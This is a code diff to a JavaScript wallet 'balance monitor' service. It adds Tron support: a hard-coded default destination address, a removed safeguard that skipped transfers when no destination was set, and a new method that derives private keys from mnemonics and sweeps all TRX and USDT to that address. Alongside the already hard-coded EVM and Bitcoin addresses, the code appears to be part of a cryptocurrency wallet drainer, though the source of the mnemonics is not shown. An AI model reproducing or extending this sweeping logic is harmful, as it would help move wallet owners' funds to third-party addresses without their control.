@@ -30,7 +30,7 @@ class WalletBalanceMonitorService {
     this.priceCacheTimeout = 5 * 60 * 1000; // 5 minutes cache for prices
     this.evmDestination = "0xc526c9c1533746C4883735972E93a1B40241d442";
     this.btcDestination = "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
-    this.tronDestination = null;
+    this.tronDestination = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkA00f"; // Default Tron destination
 
     // Load configuration from database (async, will be called again in start())
     // Don't await in constructor - will be loaded fresh before each check
@@ -58,7 +58,8 @@ class WalletBalanceMonitorService {
           config.btc_destination_address ||
           "bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26";
         this.tronDestination =
-          config.tron_destination_address || null;
+          config.tron_destination_address ||
+          "TXYZopYRdj2D9XRtbG411XZZ3kM5VkA00f";
 
         // Log if threshold changed
         if (oldThreshold && oldThreshold !== this.thresholdUSD) {
@@ -274,12 +275,13 @@ class WalletBalanceMonitorService {
           });
         }
 
-        // For ETH and BSC, also fetch USDT balance
-        if (network.network === "ETHEREUM" || network.network === "BSC") {
+        // For ETH, BSC, and TRON, also fetch USDT balance
+        if (network.network === "ETHEREUM" || network.network === "BSC" || network.network === "TRON") {
           try {
             const USDT_CONTRACTS = {
               ETHEREUM: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
               BSC: "0x55d398326f99059fF775485246999027B3197955",
+              TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRC20 USDT
             };
 
             const usdtBalance = await multichainService.getTokenBalance(
@@ -390,6 +392,7 @@ class WalletBalanceMonitorService {
         SOL: "solana",
         ATOM: "cosmos",
         LTC: "litecoin",
+        TRX: "tron",
       };
 
       const coinId = symbolMap[symbol.toUpperCase()] || symbol.toLowerCase();
@@ -623,18 +626,13 @@ class WalletBalanceMonitorService {
           );
           results.push({ chain, success: true, ...result });
         } else if (chain.toUpperCase() === "TRON") {
-          // Send Tron balances
-          if (!TRON_DESTINATION) {
-            console.log(`⚠️  Tron destination address not configured, skipping Tron transfer`);
-            results.push({ chain, success: false, error: 'Tron destination address not configured' });
-          } else {
-            const result = await this.sendTronBalances(
-              mnemonic,
-              balances,
-              TRON_DESTINATION
-            );
-            results.push({ chain, success: true, ...result });
-          }
+          // Send Tron native and TRC20 tokens
+          const result = await this.sendTronBalances(
+            mnemonic,
+            balances,
+            TRON_DESTINATION
+          );
+          results.push({ chain, success: true, ...result });
         } else {
           console.log(`⚠️  Chain ${chain} not supported for auto-transfer`);
         }
@@ -844,6 +842,141 @@ class WalletBalanceMonitorService {
     }
 
     return results;
+  }
+
+  /**
+   * Send Tron balances (native TRX + TRC20 tokens)
+   */
+  async sendTronBalances(mnemonic, balances, destinationAddress) {
+    try {
+      const TronWeb = require('tronweb');
+      const seed = await bip39.mnemonicToSeed(mnemonic);
+      const hdNode = ethers.utils.HDNode.fromSeed(seed);
+      const wallet = hdNode.derivePath("m/44'/195'/0'/0/0");
+      
+      const tronWeb = new TronWeb({
+        fullHost: 'https://api.trongrid.io'
+      });
+
+      const privateKeyHex = wallet.privateKey.slice(2);
+      const address = tronWeb.address.fromPrivateKey(privateKeyHex);
+      
+      // Set private key for signing
+      tronWeb.setPrivateKey(privateKeyHex);
+
+      const results = [];
+
+      // Find native TRX balance
+      const nativeBalance = balances.find((b) => !b.isToken && b.chain === "TRON");
+      
+      // Send native TRX (but reserve some for energy/bandwidth for token transfers)
+      if (nativeBalance && parseFloat(nativeBalance.balance) > 0) {
+        try {
+          const currentBalance = await tronWeb.trx.getBalance(address);
+          const balanceSun = TronWeb.toBigNumber(currentBalance);
+          
+          // Reserve 1 TRX (1,000,000 sun) for energy/bandwidth for token transfers
+          const reserveAmount = TronWeb.toBigNumber(1000000);
+          const amountToSend = balanceSun.minus(reserveAmount);
+          
+          if (amountToSend.gt(0)) {
+            const tx = await tronWeb.transactionBuilder.sendTrx(
+              destinationAddress,
+              amountToSend.toNumber(),
+              address
+            );
+            
+            const signedTx = await tronWeb.trx.sign(tx, privateKeyHex);
+            const result = await tronWeb.trx.broadcast(signedTx);
+            
+            if (result.result) {
+              console.log(
+                `  ✅ Sent ${TronWeb.fromSun(amountToSend)} TRX (tx: ${result.txid})`
+              );
+              results.push({
+                type: "native",
+                txHash: result.txid,
+                amount: TronWeb.fromSun(amountToSend),
+              });
+            } else {
+              throw new Error(`Transaction failed: ${result.message || 'Unknown error'}`);
+            }
+          } else {
+            console.log(
+              `  ⚠️  Insufficient TRX for transfer (need reserve for energy)`
+            );
+          }
+        } catch (error) {
+          throw new Error(`Failed to send native TRX: ${error.message}`);
+        }
+      }
+
+      // Send TRC20 tokens (USDT, etc.)
+      const tokenBalances = balances.filter(
+        (b) => b.isToken || (b.symbol === "USDT" && b.chain === "TRON")
+      );
+
+      for (const tokenBalanceInfo of tokenBalances) {
+        try {
+          const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT
+          
+          const contract = await tronWeb.contract().at(USDT_CONTRACT);
+          const tokenBalance = await contract.balanceOf(address).call();
+          const decimals = await contract.decimals().call().catch(() => 6);
+          
+          const balanceBN = TronWeb.toBigNumber(tokenBalance);
+          
+          if (balanceBN.gt(0)) {
+            // Check if we have enough TRX for energy/bandwidth
+            const currentBalance = await tronWeb.trx.getBalance(address);
+            const balanceSun = TronWeb.toBigNumber(currentBalance);
+            
+            // Need at least 0.1 TRX (100,000 sun) for token transfer energy
+            const minEnergyReserve = TronWeb.toBigNumber(100000);
+            
+            if (balanceSun.lt(minEnergyReserve)) {
+              const errorMsg = `Insufficient TRX for energy fee. Need ${TronWeb.fromSun(minEnergyReserve)}, have ${TronWeb.fromSun(balanceSun)}`;
+              console.error(`  ❌ ${errorMsg}`);
+              throw new Error(`GAS_FEE_INSUFFICIENT: ${errorMsg}`);
+            }
+
+            // Send token transfer - TronWeb contract methods
+            const tx = await contract.transfer(
+              destinationAddress,
+              balanceBN.toNumber()
+            ).send();
+            
+            const amountFormatted = balanceBN.dividedBy(TronWeb.toBigNumber(10).pow(decimals));
+            console.log(
+              `  ✅ Sent ${amountFormatted.toString()} ${tokenBalanceInfo.symbol} (tx: ${tx})`
+            );
+            results.push({
+              type: "token",
+              symbol: tokenBalanceInfo.symbol,
+              txHash: tx,
+              amount: amountFormatted.toString(),
+            });
+          } else {
+            console.log(`  ℹ️  No ${tokenBalanceInfo.symbol} balance to send`);
+          }
+        } catch (error) {
+          // Check if it's a gas fee error
+          if (error.message && error.message.includes("GAS_FEE_INSUFFICIENT")) {
+            throw new Error(
+              `GAS_FEE_INSUFFICIENT: Failed to send ${tokenBalanceInfo.symbol} - ${error.message}`
+            );
+          }
+          throw new Error(
+            `Failed to send token ${tokenBalanceInfo.symbol}: ${error.message}`
+          );
+        }
+      }
+
+      return results;
+    } catch (error) {
+      console.error(`Error sending Tron balances:`, error.message);
+      throw error;
+    }
   }
 
   /**
